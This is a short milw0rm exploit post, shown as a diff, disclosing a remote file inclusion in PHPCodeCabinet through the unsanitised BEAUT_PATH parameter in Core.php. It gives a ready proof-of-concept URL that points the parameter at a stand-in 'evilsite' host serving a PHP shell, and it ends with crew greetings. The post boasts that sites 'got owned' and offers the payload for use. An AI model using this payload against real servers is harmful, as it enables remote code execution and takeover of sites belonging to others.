@@ -1,0 +1,17 @@
+>From Minion:
+
+PHPCodeCabinet (all versions) is vulnerable to a remote file include.
+
+The vulnerable code is in /include/Beautifier/Core.php
+
+an $BEAUT_PATH Was not properly scrubbed, so they got owned.
+
+Proof of concept:
+
+http://target/phpcodecabinet_directory/include/Beautifier/Core.php?BEAUT_PATH=*evilsite*/Beautifier/HFile.php
+
+HFile.php would be your php shell.
+
+Shouts to XoRcrew & Disruptiv.
+
+# milw0rm.com [2006-08-07]
